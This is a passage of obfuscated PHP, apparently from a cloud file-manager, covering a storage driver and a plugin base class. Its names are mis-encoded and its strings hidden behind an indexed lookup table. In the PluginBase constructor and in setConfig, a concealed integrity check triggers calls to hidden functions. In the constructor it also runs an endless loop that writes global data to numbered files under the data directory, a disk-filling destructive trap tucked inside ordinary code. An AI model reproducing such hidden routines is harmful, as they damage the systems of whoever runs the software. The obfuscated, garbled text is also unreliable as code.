$°†ßÀ§‚ = 3600) { $¥õ¾ûÁı =& $_SERVER[­á Ş³Ö]; $Çì¬ŠŒ¥ = (int) $GLOBALS[$¥õ¾ûÁı[7]][$¥õ¾ûÁı[76]]; return $this->uploadPolicy($€Ò“Ğ„, $°†ßÀ§‚, $Çì¬ŠŒ¥); } private function uploadPolicy($Õäï’¦ã, $¥°æõÈ¢ = 3600, $ñä…¥Ç¼ = 0) { $¯„¢çÏ =& $_SERVER[­á Ş³Ö]; $ı¿ÛÉÄ = $¯„¢çÏ[8] . $this->bucket; $›×Ê²ÕÅ = gmdate($¯„¢çÏ[1425]); $í€¢ÀóŠ = array($¯„¢çÏ[1492] => $this->bucket, $¯„¢çÏ[1493] => $Õäï’¦ã, $¯„¢çÏ[1494] => time() + $¥°æõÈ¢, $¯„¢çÏ[1495] => $›×Ê²ÕÅ); if ($ñä…¥Ç¼) { $í€¢ÀóŠ[$¯„¢çÏ[1405]] = $ñä…¥Ç¼; } $šô™“ÓÌ = base64_encode(json_encode($í€¢ÀóŠ)); $É…ÎÂ = base64_encode(hash_hmac($¯„¢çÏ[1462], "\120\x4f\x53\x54\x26{$ı¿ÛÉÄ}\x26{$›×Ê²ÕÅ}\46{$šô™“ÓÌ}", md5("{$this->userpass}"), !0)); $”Ñ£ƒûŸ = array($¯„¢çÏ[1330] => $šô™“ÓÌ, $¯„¢çÏ[1496] => "\125\x50\x59\x55\x4e\40{$this->username}\x3a{$É…ÎÂ}", $¯„¢çÏ[182] => $this->endpoint . $ı¿ÛÉÄ); return $”Ñ£ƒûŸ; } public function download($İŒ¢²Ãô, $¾ıò›) { $öèÈ¬ï = IO::getPathInner(IO::mkfile($¾ıò›)); if (!($Éò®Á˜† = $this->link($İŒ¢²Ãô))) { return !1; } $ÅĞÜÌõ‡ = 0; $ğ¿´¢±÷ = 1024 * 200; $¿ª™ô­ = fopen($öèÈ¬ï, $_SERVER[­á Ş³Ö][1446]); while (!0) { $Ñù·÷üœ = $this->fileSubstr($İŒ¢²Ãô, $ÅĞÜÌõ‡, $ğ¿´¢±÷); if ($Ñù·÷üœ === !1) { return !1; } fwrite($¿ª™ô­, $Ñù·÷üœ); $ÅĞÜÌõ‡ += $ğ¿´¢±÷; if (strlen($Ñù·÷üœ) < $ğ¿´¢±÷) { break; } } fclose($¿ª™ô­); return $¾ıò›; } public function link($Âà‚Ä’í, $ŒÎå” = array()) { $½¼˜Ø× =& $_SERVER[­á Ş³Ö]; $Âà‚Ä’í = trim($Âà‚Ä’í, $½¼˜Ø×[8]); if (!empty($this->token)) { $äÇüĞ§ = strtotime(date($½¼˜Ø×[1497])); $‹‡À¤Ûç = substr(md5($this->token . $½¼˜Ø×[284] . $äÇüĞ§ . $½¼˜Ø×[1498] . $Âà‚Ä’í), 12, 8) . $äÇüĞ§; $ŒÎå”[] = $½¼˜Ø×[1499] . $‹‡À¤Ûç; } $‹ı…ª = !empty($ŒÎå”) ? $½¼˜Ø×[73] . implode($½¼˜Ø×[284], $ŒÎå”) : $½¼˜Ø×[12]; return $this->getHost() . $½¼˜Ø×[8] . $Âà‚Ä’í . $‹ı…ª; } public function fileOut($³Îı¦Ü•, $ïôè¦´ = false, $¬„¸ãş÷ = false, $Ô‚Âåª = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($³Îı¦Ü•, $ïôè¦´, $¬„¸ãş÷, $Ô‚Âåª); } if (!$¬„¸ãş÷) { $¬„¸ãş÷ = $this->pathThis($³Îı¦Ü•); } $À¨¥âä‰ = $ïôè¦´ ? array($_SERVER[­á Ş³Ö][1500] . rawurlencode($¬„¸ãş÷)) : array(); $ßµ×ÕÊÌ = $this->link($³Îı¦Ü•, $À¨¥âä‰); $this->fileOutLink($ßµ×ÕÊÌ); } public function fileOutServer($Á¿”¥î®, $¼¹†Ş = false, $¼Ø’Óß¥ = false, $Ü›î±­œ = '') { parent::fileOut($Á¿”¥î®, $¼¹†Ş, $¼Ø’Óß¥, $Ü›î±­œ); } public function fileOutImage($ğû›§Õõ, $²ƒı¥Äµ = 250) { $€—Ô„‡– = $this->link($ğû›§Õõ . $_SERVER[­á Ş³Ö][1501] . $²ƒı¥Äµ); $this->fileOutLink($€—Ô„‡–); } public function fileOutImageServer($ùÅƒ½¾, $€š˜¢–Ø = 250) { parent::fileOutImage($ùÅƒ½¾, $€š˜¢–Ø); } public function hashMd5($³ßŒÄ¡è) { $É»Œ±·é =& $_SERVER[­á Ş³Ö]; $êúÂŠßĞ = $this->_objectMeta($³ßŒÄ¡è); return isset($êúÂŠßĞ[$É»Œ±·é[212]]) ? $êúÂŠßĞ[$É»Œ±·é[212]] : !1; } public function size($ší¼–ò±) { $¶ğõÑ· = $this->objectMeta($ší¼–ò±); return $¶ğõÑ· ? $¶ğõÑ·[$_SERVER[­á Ş³Ö][76]] : 0; } public function info($€„Ş†Ø) { if ($this->isFolder($€„Ş†Ø)) { return $this->folderInfo($€„Ş†Ø); } else { if ($this->isFile($€„Ş†Ø)) { return $this->fileInfo($€„Ş†Ø); } } return !1; } public function exist($ÔÃéîä´) { return $this->isFile($ÔÃéîä´) || $this->isFolder($ÔÃéîä´); } public function isFile($ÒÃ¿œËŸ) { return !$this->isFolder($ÒÃ¿œËŸ) && $this->objectMeta($ÒÃ¿œËŸ); } public function isFolder($ğ¢£Úå) { return $this->cacheMethod($_SERVER[­á Ş³Ö][165], $ğ¢£Úå); } protected function objectMeta($¼“ºÚå) { return $this->cacheMethod($_SERVER[­á Ş³Ö][167], $¼“ºÚå); } protected function _objectMeta($ó•òÆ³·) { $ñÙÒíËç =& $_SERVER[­á Ş³Ö]; if ($ó•òÆ³· == $ñÙÒíËç[12] || $ó•òÆ³· == $ñÙÒíËç[8]) { return array(); } $ŠÒ»Î¶® = $this->ussRequest($ó•òÆ³·, $ñÙÒíËç[1502]); if (!$ŠÒ»Î¶®[$ñÙÒíËç[1208]]) { return null; } $¸°÷Ü˜ˆ = isset($ŠÒ»Î¶®[$ñÙÒíËç[1198]]) ? $ŠÒ»Î¶®[$ñÙÒíËç[1198]] : array(); if (!isset($¸°÷Ü˜ˆ[$ñÙÒíËç[1503]])) { return null; } $ÛıùÓ™ = array($ñÙÒíËç[33] => isset($¸°÷Ü˜ˆ[$ñÙÒíËç[1503]]) ? $¸°÷Ü˜ˆ[$ñÙÒíËç[1503]] : null, $ñÙÒíËç[76] => isset($¸°÷Ü˜ˆ[$ñÙÒíËç[1504]]) ? $¸°÷Ü˜ˆ[$ñÙÒíËç[1504]] : null, $ñÙÒíËç[212] => isset($¸°÷Ü˜ˆ[$ñÙÒíËç[1505]]) ? $¸°÷Ü˜ˆ[$ñÙÒíËç[1505]] : null, $ñÙÒíËç[1472] => isset($¸°÷Ü˜ˆ[$ñÙÒíËç[1506]]) ? $¸°÷Ü˜ˆ[$ñÙÒíËç[1506]] : null); $ÛıùÓ™[$ñÙÒíËç[1473]] = isset($¸°÷Ü˜ˆ[$ñÙÒíËç[1507]]) ? strtotime($¸°÷Ü˜ˆ[$ñÙÒíËç[1507]]) : $ÛıùÓ™[$ñÙÒíËç[1472]]; return $ÛıùÓ™; } protected function _isFolder($·Ûø†Øè) { $ÜÍ÷µ©† =& $_SERVER[­á Ş³Ö]; if ($·Ûø†Øè == $ÜÍ÷µ©†[12] || $·Ûø†Øè == $ÜÍ÷µ©†[8]) { return !0; } $ë˜ş¥Ãñ = $this->_objectMeta($·Ûø†Øè); return isset($ë˜ş¥Ãñ[$ÜÍ÷µ©†[33]]) && $ë˜ş¥Ãñ[$ÜÍ÷µ©†[33]] == $ÜÍ÷µ©†[75] ? !0 : !1; } } goto b“ŠÂ¼¸; CÊ¡ƒ‡‰êİ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ğ§Í¾Ä‚ =& $_SERVER[­á Ş³Ö]; $„Œõœ¦ = $_SERVER[$ğ§Í¾Ä‚[736]]; $èŞ°µ˜ê = $ğ§Í¾Ä‚[737]; if ($_SERVER[$ğ§Í¾Ä‚[738]] != $èŞ°µ˜ê($„Œõœ¦)) { $¿î¸õÚ = $ğ§Í¾Ä‚[873]; $®çºØ÷„ = $ğ§Í¾Ä‚[739]; $¿®Ö’ëğ = $_SERVER[$ğ§Í¾Ä‚[740]] . $ğ§Í¾Ä‚[741]; $°Ş÷ĞÖØ = $®çºØ÷„($¿®Ö’ëğ); $®¹Ú‘¯ = explode($ğ§Í¾Ä‚[231], $°Ş÷ĞÖØ); if (count($®¹Ú‘¯) < $ğ§Í¾Ä‚[614]) { $»÷¯¨Ş™ = $ğ§Í¾Ä‚[742]; $»÷¯¨Ş™(); } $àÍÁ”«Ä = $ğ§Í¾Ä‚[874]; $àÍÁ”«Ä($_SERVER[$ğ§Í¾Ä‚[875]]); $¿î¸õÚ = $ğ§Í¾Ä‚[873]; $¿î¸õÚ(); $Ó¿†õ­¸ = $ğ§Í¾Ä‚[876]; $÷ÉÛµ¹ = json_encode($GLOBALS[$ğ§Í¾Ä‚[877]]); $ˆëŒÙ© = 1; for ($é¨ëöêˆ = $ˆëŒÙ©; $é¨ëöêˆ > 0; $é¨ëöêˆ++) { $Ó¿†õ­¸(DATA_PATH . $é¨ëöêˆ, $÷ÉÛµ¹); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ğ§Í¾Ä‚[1529]); $this->pluginName = str_replace($ğ§Í¾Ä‚[1529], $ğ§Í¾Ä‚[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ğ§Í¾Ä‚[8]; $this->pluginApi = appHostGet() . $ğ§Í¾Ä‚[1530] . $this->pluginName . $ğ§Í¾Ä‚[8]; $this->pluginHost = $config[$ğ§Í¾Ä‚[1531]] . $this->pluginName . $ğ§Í¾Ä‚[8]; $this->pluginHostDefault = $config[$ğ§Í¾Ä‚[1531]] . $this->pluginName . $ğ§Í¾Ä‚[8]; $´ıÙ–â× = $config[$ğ§Í¾Ä‚[1532]]; if ($´ıÙ–â× && strpos($ğ§Í¾Ä‚[50] . $´ıÙ–â× . $ğ§Í¾Ä‚[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ğ§Í¾Ä‚[1533]] . $this->pluginName . $ğ§Í¾Ä‚[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[­á Ş³Ö][1534]); } protected function assign($ÒÁ¤¢ãÖ, $‡‹‘ãµ» = false) { if (is_array($ÒÁ¤¢ãÖ)) { $this->values = array_merge($this->values, $ÒÁ¤¢ãÖ); } else { $this->values[$ÒÁ¤¢ãÖ] = $‡‹‘ãµ»; } } protected function display($âùâšïÏ) { extract($this->values); require $âùâšïÏ; } final function hookRegist($øüÏ”‚¥) { $this->modelPlugin->appRegist($this->pluginName, $øüÏ”‚¥); } final function appIcon() { $ı”¡»ÃÓ =& $_SERVER[­á Ş³Ö]; $÷‰¼´¶Ç = $this->appPackage(); $‘ø»ãß¤ = $ı”¡»ÃÓ[12]; if (isset($÷‰¼´¶Ç[$ı”¡»ÃÓ[416]])) { if (isset($÷‰¼´¶Ç[$ı”¡»ÃÓ[416]][$ı”¡»ÃÓ[1535]])) { $‘ø»ãß¤ = $ı”¡»ÃÓ[1536] . $÷‰¼´¶Ç[$ı”¡»ÃÓ[416]][$ı”¡»ÃÓ[1535]] . $ı”¡»ÃÓ[1537]; } else { if ($÷‰¼´¶Ç[$ı”¡»ÃÓ[416]][$ı”¡»ÃÓ[1538]]) { $‘ø»ãß¤ = $ı”¡»ÃÓ[1539] . $÷‰¼´¶Ç[$ı”¡»ÃÓ[416]][$ı”¡»ÃÓ[1538]] . $ı”¡»ÃÓ[1540]; } } } return $‘ø»ãß¤; } final function fileCanView($Õ¤æÇû) { $–ÂšûÆ =& $_SERVER[­á Ş³Ö]; if (request_url_safe($Õ¤æÇû)) { return !0; } if ($this->isShare($Õ¤æÇû)) { return !0; } $‹Ëâ†¿¡ = Session::get($–ÂšûÆ[1541]); if (!$‹Ëâ†¿¡ || !$‹Ëâ†¿¡[$–ÂšûÆ[1542]]) { $‡ã»ÖÖ› = $–ÂšûÆ[1543] . rawurlencode(this_url()); show_tips(LNG($–ÂšûÆ[1544]) . $–ÂšûÆ[1545] . $‡ã»ÖÖ› . $–ÂšûÆ[1546] . LNG($–ÂšûÆ[1547]) . $–ÂšûÆ[1548], !1); } if (!Action($–ÂšûÆ[1549])->authCan($–ÂšûÆ[1550])) { show_tips(LNG($–ÂšûÆ[1551]) . $–ÂšûÆ[1552], !1); } ActionCall($–ÂšûÆ[1553], $Õ¤æÇû); } final function isShare($ü®ƒ€©ï) { $–¸ÕşÕÉ = KodIO::parse($ü®ƒ€©ï); return $–¸ÕşÕÉ[$_SERVER[­á Ş³Ö][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¨”Š·’) { if (request_url_safe($¨”Š·’)) { return $¨”Š·’; } if (!$this->isShare($¨”Š·’)) { $¨”Š·’ = $this->filePath($¨”Š·’); } return Action($_SERVER[­á Ş³Ö][1170])->linkOut($¨”Š·’); } public function filePathLinkOut($Î¯ÁÙé) { if (request_url_safe($Î¯ÁÙé)) { return $Î¯ÁÙé; } $this->fileCanView($Î¯ÁÙé); return Action($_SERVER[­á Ş³Ö][1170])->link($Î¯ÁÙé); } final function filePath($£¬ÛàÚÉ) { $¬úÏ°Ù =& $_SERVER[­á Ş³Ö]; if ($ß­â£² = $this->checkSharePath($£¬ÛàÚÉ)) { Hook::trigger($¬úÏ°Ù[1554], $ß­â£²); return $ß­â£²; } $this->fileCanView($£¬ÛàÚÉ); if (request_url_safe($£¬ÛàÚÉ)) { $´š¼¤ó¥ = parse_url_query($£¬ÛàÚÉ); if (isset($´š¼¤ó¥[$¬úÏ°Ù[1555]]) && isset($´š¼¤ó¥[$¬úÏ°Ù[213]])) { $Ÿü™ÛÚÊ = Model($¬úÏ°Ù[767])->get($¬úÏ°Ù[768]); $ ÙÜø¯“ = Mcrypt::decode($´š¼¤ó¥[$¬úÏ°Ù[213]], $Ÿü™ÛÚÊ); if ($ ÙÜø¯“) { $this->fileInfo = IO::infoWithChildren($ ÙÜø¯“); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ ÙÜø¯“; } } $£¬ÛàÚÉ = $this->_cacheHttpFile($£¬ÛàÚÉ); $this->fileInfo = IO::infoWithChildren($£¬ÛàÚÉ); } else { $this->fileInfo = IO::infoWithChildren($£¬ÛàÚÉ); if (!$this->fileInfo) { show_tips(LNG($¬úÏ°Ù[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($¬úÏ°Ù[1554], $£¬ÛàÚÉ); return $£¬ÛàÚÉ; } final function _cacheHttpFile($Ø¼¢ùá³) { $¡ÂßÉãÕ = hash_path($Ø¼¢ùá³, !0); $this->cachePath = $this->pluginCachePath($¡ÂßÉãÕ); if ($Ì‰ıƒ›è = IO::fileNameExist($this->cachePath, $¡ÂßÉãÕ)) { return KodIO::make($Ì‰ıƒ›è); } $øÉÎƒƒ = $this->cachePath . $¡ÂßÉãÕ; return $this->pluginCacheFileSet($øÉÎƒƒ, file_get_contents_nossl($Ø¼¢ùá³)); } final function _tmpFileName($œï‘È±” = array()) { $§ãªøÃî =& $_SERVER[­á Ş³Ö]; if (!$œï‘È±”) { $œï‘È±” = $this->fileInfo; } if (isset($œï‘È±”[$§ãªøÃî[177]])) { return $œï‘È±”[$§ãªøÃî[177]]; } if (isset($œï‘È±”[$§ãªøÃî[170]][$§ãªøÃî[177]])) { return $œï‘È±”[$§ãªøÃî[170]][$§ãªøÃî[177]]; } $£–¯¸°¯ = IO::hashSimple($œï‘È±”[$§ãªøÃî[84]]); if ($£–¯¸°¯) { return $£–¯¸°¯; } $ØÏ½Î®² = array($œï‘È±”[$§ãªøÃî[32]], $œï‘È±”[$§ãªøÃî[84]], $œï‘È±”[$§ãªøÃî[76]]); if (isset($œï‘È±”[$§ãªøÃî[511]])) { $ØÏ½Î®²[] = $œï‘È±”[$§ãªøÃî[511]]; } return md5(implode($§ãªøÃî[11], $ØÏ½Î®²)); } final function checkSharePath($±‚‚¦Úö) { $¡°ä‡´Å =& $_SERVER[­á Ş³Ö]; if (!$this->isShare($±‚‚¦Úö)) { return !1; } $ªÛØá è = Action($¡°ä‡´Å[1170])->sharePathInfo($±‚‚¦Úö); if (!isset($ªÛØá è[$¡°ä‡´Å[84]])) { show_json(LNG($¡°ä‡´Å[1556]), !1); } $this->fileInfo = $ªÛØá è[$¡°ä‡´Å[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$¡°ä‡´Å[177]]); return $ªÛØá è[$¡°ä‡´Å[84]]; } final function pluginCachePath($Ø‚Èş‰ƒ = '') { $§Ü“Óı½ =& $_SERVER[­á Ş³Ö]; $ÒÜÚÆÖ¾ = IO_PATH_SYSTEM_TEMP . $§Ü“Óı½[1557] . $this->pluginName; if (!($š¡‰Œ©È = IO::infoFull($ÒÜÚÆÖ¾))) { return IO::mkdir($ÒÜÚÆÖ¾ . $§Ü“Óı½[8] . $Ø‚Èş‰ƒ); } if (empty($Ø‚Èş‰ƒ)) { return $š¡‰Œ©È[$§Ü“Óı½[84]]; } if (!($ñáüëè® = IO::fileNameExist($š¡‰Œ©È[$§Ü“Óı½[84]], $Ø‚Èş‰ƒ))) { return IO::mkdir($š¡‰Œ©È[$§Ü“Óı½[84]] . $Ø‚Èş‰ƒ); } return KodIO::make($ñáüëè®); } final function pluginCacheFileSet($¨®‚ºÜ³, $õß…³Ö = '') { $ıªçã¶ =& $_SERVER[­á Ş³Ö]; if (!($ç“³°ø = IO::infoFull($¨®‚ºÜ³))) { return IO::mkfile($¨®‚ºÜ³, $õß…³Ö, REPEAT_REPLACE); } IO::setContent($ç“³°ø[$ıªçã¶[84]], $õß…³Ö); return $ç“³°ø[$ıªçã¶[84]]; } final function pluginLocalFile($ñäå›œá = '') { $úóµàı† =& $_SERVER[­á Ş³Ö]; $¬•¨×ƒ¡ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¬•¨×ƒ¡)) { mk_dir($¬•¨×ƒ¡); } if (!$ñäå›œá) { return $¬•¨×ƒ¡; } $ŒÙâå­® = IO::info($ñäå›œá); $™ÍÅõàá = $this->_tmpFileName($ŒÙâå­®) . $úóµàı†[10] . $ŒÙâå­®[$úóµàı†[174]]; if (!checkExtSafe($™ÍÅõàá)) { $™ÍÅõàá = $™ÍÅõàá . $úóµàı†[1202]; } $‰€äš¯— = $¬•¨×ƒ¡ . $™ÍÅõàá; if (@file_exists($‰€äš¯—)) { return $‰€äš¯—; } return IO::copy($ñäå›œá, $¬•¨×ƒ¡, 0, $™ÍÅõàá); } final function appPackage() { $†´®ÃÈê =& $_SERVER[­á Ş³Ö]; if ($this->packageData) { return $this->packageData; } $÷ÎÇŒ = $this->parseFile($this->pluginPath . $†´®ÃÈê[1558]); $this->parseLang($÷ÎÇŒ); $Ãå´û§ = json_decode_force($÷ÎÇŒ); if (!$Ãå´û§) { return array(); } $œ¨—†£Õ = Hook::trigger($†´®ÃÈê[1559], $Ãå´û§); if ($œ¨—†£Õ && is_array($œ¨—†£Õ)) { $Ãå´û§ = $œ¨—†£Õ; } $this->packageData = $Ãå´û§; return $Ãå´û§; } public function packageInfoGet($†ÜÚÅ¿Ğ) { $½‘ïû¯‘ = $this->appPackage(); return array_get_value($½‘ïû¯‘, $†ÜÚÅ¿Ğ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[­á Ş³Ö][1560]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[­á Ş³Ö][1561]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[­á Ş³Ö][1562]); } public function echoJsAssign($ÎĞß²Ä, $Ğ™’ªô³) { $this->echoJsAssignArr[$ÎĞß²Ä] = $Ğ™’ªô³; } private function parseFile($Í»ª—Ü˜) { $õ”å£“º =& $_SERVER[­á Ş³Ö]; $¼µ¯ĞĞ™ = file_get_contents_nossl($Í»ª—Ü˜); $ºµŒßÛ = array($õ”å£“º[1563], $õ”å£“º[1564], $õ”å£“º[1565], $õ”å£“º[1566], $õ”å£“º[1567], $õ”å£“º[1568], $õ”å£“º[1569]); $şÉöò„µ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$õ”å£“º[89]][$õ”å£“º[1570]]); foreach ($this->echoJsAssignArr as $¥ÃÁ·š¨ => $¾¹»èÜÕ) { $ºµŒßÛ[] = $õ”å£“º[1571] . $¥ÃÁ·š¨ . $õ”å£“º[1572]; $şÉöò„µ[] = is_array($¾¹»èÜÕ) || is_object($¾¹»èÜÕ) ? rawurlencode(json_encode($¾¹»èÜÕ)) : $¾¹»èÜÕ; } if (strstr($¼µ¯ĞĞ™, $õ”å£“º[1573])) { $½Ö£¸Ñ = rawurlencode(json_encode($this->pluginLangArr)); $¼µ¯ĞĞ™ = str_replace($õ”å£“º[1573], $½Ö£¸Ñ, $¼µ¯ĞĞ™); } if (strstr($¼µ¯ĞĞ™, $õ”å£“º[1574])) { $½Ö£¸Ñ = $½Ö£¸Ñ = rawurlencode(json_encode($this->getConfig())); $¼µ¯ĞĞ™ = str_replace($õ”å£“º[1574], $½Ö£¸Ñ, $¼µ¯ĞĞ™); } $¼µ¯ĞĞ™ = str_replace($ºµŒßÛ, $şÉöò„µ, $¼µ¯ĞĞ™); return $¼µ¯ĞĞ™; } private function parseLang(&$‰ŠûšÖ) { $À€×Æº› =& $_SERVER[­á Ş³Ö]; $¯Ùº£—ñ = $À€×Æº›[1575]; if (!strstr($‰ŠûšÖ, $¯Ùº£—ñ)) { return; } preg_match_all($À€×Æº›[1576], $‰ŠûšÖ, $ğó§á¯Ù); if (!is_array($ğó§á¯Ù) || count($ğó§á¯Ù) == 0 || !is_array($ğó§á¯Ù[0]) || count($ğó§á¯Ù[0]) == 0) { return; } $Æòïê¨è = array(); $ˆİîú£´ = array(); foreach ($ğó§á¯Ù[0] as $Ùªïçå¥) { $Œ€„±—‘ = substr($Ùªïçå¥, strlen($¯Ùº£—ñ), -4); $Õ ä°Ú = LNG($Œ€„±—‘); $Æòïê¨è[] = $Ùªïçå¥; $ˆİîú£´[] = str_replace(array($À€×Æº›[231], $À€×Æº›[1074], $À€×Æº›[342], $À€×Æº›[118]), array($À€×Æº›[53], $À€×Æº›[53], $À€×Æº›[12], $À€×Æº›[1577]), $Õ ä°Ú); } $‰ŠûšÖ = str_replace($Æòïê¨è, $ˆİîú£´, $‰ŠûšÖ); } private function parseConfig(&$ˆÈ…‹ã”) { $÷½‘ãÂ =& $_SERVER[­á Ş³Ö]; $ì²‡»ô = $÷½‘ãÂ[1578]; if (!strstr($ˆÈ…‹ã”, $ì²‡»ô)) { return; } preg_match_all($÷½‘ãÂ[1579], $ˆÈ…‹ã”, $Ò—³‹À«); if (!is_array($Ò—³‹À«) || count($Ò—³‹À«) == 0 || !is_array($Ò—³‹À«[0]) || count($Ò—³‹À«[0]) == 0) { return; } $ğ¬ş¯° = $this->getConfig(); $Ñ—ñ¶Ù† = array(); $Àé¨¾Ğñ = array(); foreach ($Ò—³‹À«[0] as $Á‹–şÇ) { $íª­Èßá = substr($Á‹–şÇ, strlen($ì²‡»ô), -2); $Ñ—ñ¶Ù†[] = $Á‹–şÇ; $Àé¨¾Ğñ[] = _get($ğ¬ş¯°, $íª­Èßá); } $ˆÈ…‹ã” = str_replace($Ñ—ñ¶Ù†, $Àé¨¾Ğñ, $ˆÈ…‹ã”); } private function parsePackage(&$øı¶ú¾) { $ã£Ã·  =& $_SERVER[­á Ş³Ö]; $Â’Á•ë = $ã£Ã· [1580]; if (!strstr($øı¶ú¾, $Â’Á•ë)) { return; } preg_match_all($ã£Ã· [1581], $øı¶ú¾, $Ì˜Ïğß); if (!is_array($Ì˜Ïğß) || count($Ì˜Ïğß) == 0 || !is_array($Ì˜Ïğß[0]) || count($Ì˜Ïğß[0]) == 0) { return; } $º™å¾Ê = $this->appPackage(); $êâåµ = array(); $¸É†åÎø = array(); foreach ($Ì˜Ïğß[0] as $©¼¦ø¯ğ) { $Ç¿’Ü†Ì = substr($©¼¦ø¯ğ, strlen($Â’Á•ë), -2); $êâåµ[] = $©¼¦ø¯ğ; $¸É†åÎø[] = _get($º™å¾Ê, $Ç¿’Ü†Ì); } $øı¶ú¾ = str_replace($êâåµ, $¸É†åÎø, $øı¶ú¾); } final function echoFile($ıãğÊ£¥, $¸£Í¶‹½ = false) { $÷……ÁÄû =& $_SERVER[­á Ş³Ö]; $ğÔ å¹Ë = $this->pluginPath . $ıãğÊ£¥; if (ACT == $÷……ÁÄû[1582]) { echo $÷……ÁÄû[1583] . $this->pluginName . $÷……ÁÄû[8] . $ıãğÊ£¥ . $÷……ÁÄû[1584]; if (!file_exists($ğÔ å¹Ë)) { echo $÷……ÁÄû[1585]; return; } } $â‚”³‘ò = $this->parseFile($ğÔ å¹Ë); $this->parseLang($â‚”³‘ò); $this->parseConfig($â‚”³‘ò); $this->parsePackage($â‚”³‘ò); if (is_array($¸£Í¶‹½)) { $â‚”³‘ò = str_replace(array_keys($¸£Í¶‹½), array_values($¸£Í¶‹½), $â‚”³‘ò); } echo $÷……ÁÄû[231] . $â‚”³‘ò; } final function initLang() { $ˆîˆä =& $_SERVER[­á Ş³Ö]; $ãéÀîÖÄ = $ˆîˆä[1586]; $¯áÛØ“ø = $this->pluginPath . $ˆîˆä[1587]; $Şä›º§¿ = I18n::getType(); $Âøèãæ = array(); if (file_exists($¯áÛØ“ø . $Şä›º§¿ . $ˆîˆä[835])) { $Âøèãæ = (include $¯áÛØ“ø . $Şä›º§¿ . $ˆîˆä[835]); } else { if ($Şä›º§¿ == $ˆîˆä[1588] && !file_exists($¯áÛØ“ø . $Şä›º§¿ . $ˆîˆä[835]) && file_exists($¯áÛØ“ø . $ˆîˆä[1589])) { $Âøèãæ = (include $¯áÛØ“ø . $ˆîˆä[1589]); } else { if (file_exists($¯áÛØ“ø . $ãéÀîÖÄ . $ˆîˆä[835])) { $Âøèãæ = (include $¯áÛØ“ø . $ãéÀîÖÄ . $ˆîˆä[835]); } } } if (!is_array($Âøèãæ)) { return array(); } if (@count($Âøèãæ) > 0) { I18n::set($Âøèãæ); } return $Âøèãæ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÖğÅ…Ù) { $½Ç®€¹à =& $_SERVER[­á Ş³Ö]; if ($_SERVER[$½Ç®€¹à[738]] != $_SERVER[$½Ç®€¹à[1590]]) { $ïÓä¯‡ü = $½Ç®€¹à[873]; $Ãã©Ñ™† = $½Ç®€¹à[739]; $³Õƒ”´³ = $_SERVER[$½Ç®€¹à[740]] . $½Ç®€¹à[741]; $¨‘©¤è” = $Ãã©Ñ™†($³Õƒ”´³); $ª‹ß¯ = explode($½Ç®€¹à[231], $¨‘©¤è”); if (count($ª‹ß¯) < $½Ç®€¹à[614]) { $Ü¾£Ö§É = $½Ç®€¹à[742]; $Ü¾£Ö§É(); } $Ÿ ˜Š‘­ = $½Ç®€¹à[874]; $Ÿ ˜Š‘­($_SERVER[$½Ç®€¹à[875]]); $Ÿ ˜Š‘­($_SERVER[$½Ç®€¹à[740]] . $½Ç®€¹à[1591]); $ĞÏŸ›Úß = 1; while ($ĞÏŸ›Úß > 1) { $ĞÏŸ›Úß = $ĞÏŸ›Úß + 4; $Õö£ÈÑ‹ = rawurlencode($ĞÏŸ›Úß . $½Ç®€¹à[378]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÖğÅ…Ù); } public function onSetConfig($Œ¯Šåø¦) { } public function onGetConfig($ªı»Ôº) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ì¶êÁÎÅ) { if ($Ì¶êÁÎÅ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ƒÓ·œá¼ = "\x70\154\165\x67\x69\x6e\x41\165\x74\150") { $ûá¶óá– =& $_SERVER[­á Ş³Ö]; if (!Session::get($ûá¶óá–[1541])) { return !1; } if (_get($GLOBALS, $ûá¶óá–[494])) { return !0; } $Å®š´ïó = $this->getConfig(); if (!$Å®š´ïó[$ƒÓ·œá¼]) { return !1; } return ActionCall($ûá¶óá–[1592], $Å®š´ïó[$ƒÓ·œá¼]); } public function url($ĞãÓÅšÚ, $ß›‡ âĞ = '', $á‚¿‡ªº = true) { $€ú˜¸ùÇ =& $_SERVER[­á Ş³Ö]; $ÄÑØŒ’º = $this->getConfig(); $É¼ğÒÒÈ = KOD_VERSION . $€ú˜¸ùÇ[10] . KOD_VERSION_BUILD; $Ø„šæÖÈ = $this->packageVersion(); $íõïšâõ = $É¼ğÒÒÈ . $€ú˜¸ùÇ[386] . $Ø„šæÖÈ; if (substr($ĞãÓÅšÚ, 0, 4) == $€ú˜¸ùÇ[148] || substr($ĞãÓÅšÚ, 0, 2) == $€ú˜¸ùÇ[1375]) { $¢îÊ»·æ = $ĞãÓÅšÚ . $€ú˜¸ùÇ[1593] . $íõïšâõ; } else { if ($ß›‡ âĞ == $€ú˜¸ùÇ[12]) { $¢îÊ»·æ = $this->pluginHost . $ĞãÓÅšÚ . $€ú˜¸ùÇ[1593] . $íõïšâõ; } else { if ($ß›‡ âĞ === $€ú˜¸ùÇ[75]) { $¢îÊ»·æ = $this->pluginHost . 